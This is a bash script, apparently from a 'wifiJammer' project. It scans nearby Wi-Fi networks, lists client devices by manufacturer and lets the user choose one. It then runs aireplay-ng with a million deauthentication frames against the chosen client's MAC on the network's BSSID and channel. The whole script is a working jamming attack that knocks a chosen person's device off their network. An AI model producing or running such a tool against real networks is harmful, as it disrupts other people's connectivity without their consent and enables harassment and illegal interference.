#!/bin/bash

transparent="\e[0m"
bReverse="\e[7;1m"
title="\e[3;33m"
warning="\033[1;31m"

clear

ans="n"

intSelected="none"
$networkC
allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1)


function restoreInterface {
        echo -e $title"Restore your internet connection"$transparent
        echo "Please wait..."
       	sudo ifconfig $intSelected down
       	sudo iwconfig $intSelected mode managed
       	sudo ifconfig $intSelected up
       	sudo service network-manager restart
       	echo -e $green"Done."$transparent
}

function ctrl_c() {
        restoreInterface
        exit
}

while [ $ans != "y" ]
do
	for interface in $allInterface
	do
		echo -e $title" choose the interface :"$transparent
		echo $allInterface
		echo
		echo -e $bReverse""$interface" (y/n)"$transparent
		read ans
		if [ $ans = "y" ]; then
			intSelected=$interface
			break
		fi
		clear
	done
done

if [ $intSelected = "none" ]; then
	echo -e $warning"please next time select an interface"$transparent
	exit
fi

sudo ./wifiJammer/src/scanUser.sh $intSelected

#Catch the ctrl_c event
trap ctrl_c INT


i=-1
target="none"
bssid=$(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm1 "(?<=<BSSID>)[^<]+")
name=$(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<client-manuf>)[^<]+" | sed "s/ /_/g")

while [ $target = "none" ]
do
	i=0
	for select in $name
	do
		i=$[i+1]
		clear
		echo -e $title"select a target :\n$name $transparent \n\n"
		echo -e $bReverse"---"$select"---"$transparent
		read ans
		if [ $ans = "y" ]; then
			target=$select
			break
		fi
	done
done


tabM=($(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<client-mac>)[^<]+"))
echo ${tabM[0]}"val1"
echo ${tabM[1]}"val2"
echo "--------------------"

tabC=($(cat result/scanNetwork/user-01.kismet.netxml | grep -oPm100 "(?<=<channel>)[^<]+" ))

echo "*********************"

echo "BBSID : "$bssid
echo "Mac : "${tabM[i]}
echo "Channel : "${tabC[$[i+1]]}
sudo iwconfig $intSelected channel ${tabC[$[i+1]]}
xterm -title "Jamm the user $target" -e sudo aireplay-ng -0 1000000 -a $bssid $intSelected -j -c ${tabM[i]}


